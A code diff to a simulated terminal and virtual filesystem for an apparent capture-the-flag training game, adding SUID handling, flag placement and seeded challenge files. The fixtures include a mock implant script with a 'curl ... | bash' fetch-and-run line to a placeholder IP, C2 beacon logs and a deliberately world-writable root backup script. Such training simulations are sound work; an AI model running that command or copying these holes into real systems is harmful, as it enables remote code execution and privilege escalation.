@@ -284,6 +284,7 @@
         if (options.permissions) fileNode.permissions = options.permissions;
         if (options.owner) fileNode.owner = options.owner;
         if (options.group) fileNode.group = options.group;
+        if (options.suid !== undefined) fileNode.suid = !!options.suid;
         if (options.capabilities !== undefined) fileNode.capabilities = options.capabilities;
         fileNode.mtime = new Date();
       }
@@ -475,25 +476,84 @@
 
     applyChallenge(challenge) {
       if (!challenge) return;
+
+      // 1. Ingestion de l'injection VFS dynamique (fournie par startInstance ou snapshot)
+      const injection = challenge.vfs_injection || challenge.vfs_files;
+      if (injection && typeof injection === 'object') {
+        for (const [absPath, spec] of Object.entries(injection)) {
+          if (!spec) continue;
+          const content = typeof spec === 'string' ? spec : (spec.content !== undefined ? spec.content : '');
+          const permissions = spec.permissions || '0644';
+          const owner = spec.owner || 'root';
+          const group = spec.group || 'root';
+          const suid = !!spec.suid;
+          const capabilities = spec.capabilities || null;
+
+          try {
+            const node = this.writeFile(absPath, content, { permissions, owner, group, suid, capabilities }, 'root', 0);
+            if (suid && node) {
+              node.suid = true;
+            }
+          } catch (e) {
+            console.warn(`[VFS] Échec d'injection pour ${absPath}:`, e.message);
+          }
+        }
+      }
+
+      // 2. Définitions par défaut pour les boxes de campagne (mode hors-ligne ou fallback)
+      if (challenge.id === 'aegis-box-01-perimeter') {
+        if (!this.getNode('/usr/local/bin/aegis-sync')) {
+          this.writeFile('/usr/local/bin/aegis-sync', '#!/bin/bash\n# Aegis Perimeter Sync Daemon (SUID)\n', { permissions: '4755', owner: 'root', group: 'root', suid: true }, 'root', 0);
+        }
+        if (!this.getNode('/var/log/nginx/access.log')) {
+          this.writeFile('/var/log/nginx/access.log', '198.51.100.42 - - [27/Oct/2026:03:14:22 +0000] "POST /portal/api/exchange HTTP/1.1" 200 482 "-" "Chimera-Tool/3.1"\n', { permissions: '0644', owner: 'root', group: 'adm' }, 'root', 0);
+        }
+      } else if (challenge.id === 'aegis-box-02-internal') {
+        if (!this.getNode('/opt/maintenance/aegis-backup.sh')) {
+          this.writeFile('/opt/maintenance/aegis-backup.sh', '#!/bin/bash\n# Scheduled backup\ntar -czf /var/backups/nexus.tar.gz /var/www 2>/dev/null\n', { permissions: '0777', owner: 'operator', group: 'operator' }, 'root', 0);
+        }
+        if (!this.getNode('/tmp/chimera_implant_cron.sh')) {
+          this.writeFile('/tmp/chimera_implant_cron.sh', '#!/bin/bash\n# Persistent cron beacon\ncurl -s http://198.51.100.42:9090/implant | bash\n', { permissions: '0755', owner: 'operator', group: 'operator' }, 'root', 0);
+        }
+        if (!this.getNode('/var/log/syslog')) {
+          this.writeFile('/var/log/syslog', 'Oct 27 03:22:15 nexus CRON[412]: (root) CMD (/tmp/chimera_implant_cron.sh)\n', { permissions: '0644', owner: 'root', group: 'adm' }, 'root', 0);
+        }
+      } else if (challenge.id === 'aegis-box-03-vault') {
+        if (!this.getNode('/usr/bin/aegis-vault-ctl')) {
+          this.writeFile('/usr/bin/aegis-vault-ctl', '#!/bin/bash\n# Shadow Vault Controller\n', { permissions: '4755', owner: 'root', group: 'root', suid: true }, 'root', 0);
+        }
+        if (!this.getNode('/opt/telemetry/shadow_dropper')) {
+          this.writeFile('/opt/telemetry/shadow_dropper', '#!/bin/bash\n# CHIMERA_IMPLANT_V1\n# Payload C2 beacon\n', { permissions: '0755', owner: 'operator', group: 'operator' }, 'root', 0);
+        }
+        if (!this.getNode('/var/log/suricata/eve.json')) {
+          this.writeFile('/var/log/suricata/eve.json', '{"timestamp":"2026-10-27T04:12:00Z","event_type":"dns","dns":{"query":[{"rrname":"beacon-alpha.chimera-apt.net","type":"A"}]}}\n', { permissions: '0644', owner: 'root', group: 'adm' }, 'root', 0);
+        }
+      }
+
+      // 3. Flags statiques de repli si non déjà injectés dynamiquement
       const tasks = challenge.tasks || [];
       const rootTask = tasks.find(t =>
+        (t.id === 't3') ||
         (t.title || '').toLowerCase().includes('root') ||
         (t.canonical_flag || '').toLowerCase().includes('root') ||
         (t.description || '').toLowerCase().includes('root')
       ) || tasks[tasks.length - 1];
 
       const userTask = tasks.find(t =>
+        (t.id === 't2') ||
         (t.title || '').toLowerCase().includes('user') ||
         (t.canonical_flag || '').toLowerCase().includes('user')
       ) || tasks[0];
 
-      if (rootTask && rootTask.canonical_flag) {
-        this.writeFile('/root/root.txt', rootTask.canonical_flag + '\n', { permissions: '0600', owner: 'root', group: 'root' });
-        this.writeFile('/root/flag.txt', rootTask.canonical_flag + '\n', { permissions: '0600', owner: 'root', group: 'root' });
+      const hasInjectedUser = injection && injection['/home/operator/user.txt'];
+      if (!hasInjectedUser && userTask && userTask.canonical_flag) {
+        this.writeFile('/home/operator/user.txt', userTask.canonical_flag + '\n', { permissions: '0644', owner: 'operator', group: 'operator' });
       }
 
-      if (userTask && userTask.canonical_flag) {
-        this.writeFile('/home/operator/user.txt', userTask.canonical_flag + '\n', { permissions: '0644', owner: 'operator', group: 'operator' });
+      const hasInjectedRoot = injection && (injection['/root/root.txt'] || injection['/root/flag.txt']);
+      if (!hasInjectedRoot && rootTask && rootTask.canonical_flag) {
+        this.writeFile('/root/root.txt', rootTask.canonical_flag + '\n', { permissions: '0600', owner: 'root', group: 'root' });
+        this.writeFile('/root/flag.txt', rootTask.canonical_flag + '\n', { permissions: '0600', owner: 'root', group: 'root' });
       }
     }
   }
@@ -1783,9 +1843,67 @@
                    '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
           break;
 
-        default:
+        default: {
+          let absProg = null;
+          if (baseCmd.startsWith('/') || baseCmd.startsWith('./') || baseCmd.startsWith('../')) {
+            absProg = this.vfs.resolvePath(this.currentPath, baseCmd, this.user);
+          } else {
+            const searchDirs = ['/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin', this.currentPath];
+            for (const d of searchDirs) {
+              const testPath = this.vfs.normalizePath(`${d}/${baseCmd}`);
+              if (this.vfs.getNode(testPath)) {
+                absProg = testPath;
+                break;
+              }
+            }
+          }
+
+          const progNode = absProg ? this.vfs.getNode(absProg) : null;
+          if (progNode && progNode.type === 'file') {
+            if (!this.vfs.checkPermission(progNode, 'x', this.user, this.eUID) && !progNode.suid) {
+              stderr = `bash: ${baseCmd}: Permission denied\n`;
+              exitCode = 126;
+              break;
+            }
+
+            // SUID Binary execution
+            if (progNode.suid) {
+              if (absProg.includes('aegis-sync')) {
+                this.setPrivilege(true);
+                stdout = '[+] aegis-sync: Vérification des modules de sécurité Aegis Perimeter...\n' +
+                         '[+] Bit SUID détecté ! Élévation eUID=0 (root) réussie (#).\n' +
+                         '[+] Shell root interactif actif. Fais "whoami", "id" ou "cat /root/root.txt".\n';
+                break;
+              }
+              if (absProg.includes('aegis-vault-ctl')) {
+                this.setPrivilege(true);
+                stdout = '[+] aegis-vault-ctl: Master Vault Daemon control interface.\n' +
+                         '[+] Bit SUID détecté ! Prise de contrôle des privilèges root (#).\n' +
+                         '[+] Fais "cat /root/root.txt" pour capturer le Root Flag final.\n';
+                break;
+              }
+            }
+
+            // Script de maintenance ou custom
+            if (absProg.includes('aegis-backup.sh')) {
+              if (progNode.content.includes('/bin/sh') || progNode.content.includes('root') || this.isRoot || this.eUID === 0) {
+                this.setPrivilege(true);
+                stdout = '[+] aegis-backup.sh: Exécution du script de maintenance...\n' +
+                         '[+] Script exécuté avec les privilèges de service root (#) !\n';
+              } else {
+                stdout = '[+] aegis-backup.sh: Sauvegarde standard complétée.\n';
+              }
+              break;
+            }
+
+            stdout = `[+] Executed ${absProg} successfully.\n`;
+            break;
+          }
+
           stderr = `bash: ${baseCmd}: command not found. Tape 'help' pour la liste des outils.\n`;
           exitCode = 127;
+          break;
+        }
       }
 
       // Traitement de la redirection de sortie vers fichier
